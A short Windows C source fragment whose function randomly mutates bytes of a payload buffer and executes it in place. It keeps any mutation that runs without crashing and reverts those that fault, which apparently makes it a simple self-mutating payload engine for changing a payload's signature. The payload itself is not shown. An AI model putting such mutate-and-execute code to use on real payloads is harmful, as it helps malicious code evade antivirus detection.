#include <stdio.h>
#include <Windows.h>
#include "Unicorn2.h"

#define x86MaxInsLen 10

UINT8 BackupBuf[x86MaxInsLen] = { 0x0 };

void MuNxtPayload()
{
    int MuPos = 0;
    UINT8 bakupData = 0;
    while(1)
    {
        printf("Finding Liveable Mutation Position...\n");
        MuPos = rand() % (NextPayloadSize - 5 - x86MaxInsLen) + 4; // Keep first 4 bytes and last 1 byte
        for(int i=0; i<x86MaxInsLen; i++)
        {
            BackupBuf[i] = nextPayloadBuf[MuPos + i];
            nextPayloadBuf[MuPos + i] = rand() % 256;
        }
        __try
        {
            ((void(*)())(nextPayloadBuf + 1))();
            printf("Mutation Success @ 0x%X\n", MuPos);
            break;
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            printf("Mutation Failed @ 0x%X, revert data\n", MuPos);
            for(int i=0; i<x86MaxInsLen; i++)
            {
                nextPayloadBuf[MuPos + i] = BackupBuf[i];
            }
        }
    }
}